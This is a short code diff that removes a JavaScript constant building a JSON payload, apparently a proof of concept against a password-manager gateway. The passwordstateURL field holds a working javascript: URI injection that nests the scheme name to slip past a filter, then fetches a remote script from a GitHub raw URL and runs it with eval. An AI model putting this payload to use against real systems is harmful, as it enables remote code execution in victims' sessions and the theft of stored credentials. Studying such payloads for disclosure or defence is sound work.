@@ -1,9 +1,0 @@
-const JSON_PAYLOAD = JSON.stringify({
-  gateway: 'vault-gw.iter.org',
-  server: 'poc-nonexistent-host.invalid',
-  hosttitle: 'x',
-  user: 'x',
-  pwd: 'x',
-  domain: 'x',
-  passwordstateURL: "javasjavascript:cript:void(fetch('https://raw.githubusercontent.com/synackchoo/ywh-poc/main/pwn.js').then(r=>r.text()).then(eval))//"
-});
